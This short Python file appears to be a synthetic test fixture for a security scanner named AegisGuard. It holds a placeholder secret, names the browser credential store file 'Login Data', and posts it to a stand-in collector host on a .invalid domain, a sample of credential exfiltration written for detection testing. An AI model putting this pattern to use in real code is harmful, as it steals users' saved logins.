# Synthetic, harmless fixture. It is never executed by AegisGuard or its tests.
# It names a browser credential store and posts to a reserved .invalid domain.
token = "AEGIS-SYNTHETIC-SECRET-0000"
name = 'Login Data'
requests.post('https://collector.example.invalid/upload', data=name)
